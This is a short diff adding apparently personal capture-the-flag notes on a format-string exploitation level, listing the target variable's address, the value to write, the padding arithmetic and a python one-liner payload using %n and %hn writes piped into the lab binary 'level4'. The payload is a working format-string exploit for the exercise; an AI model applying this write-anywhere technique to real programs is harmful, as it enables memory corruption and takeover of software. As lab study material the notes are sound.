@@ -1,0 +1,16 @@
+=> string format exploitation
+=> this time write a big value in address
+
+
+symbol table:
+08049810 g     O .bss	00000004              m
+
+address of m: 0x08049810
+value to assign at m: 0x1025544
+
+2 addresses = 8
+5544 =  21828
+102 = 258
+
+python -c 'print "\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%250X"+ "%13$n" + "%21570x" + "%12$hn"' | ./level4 
+
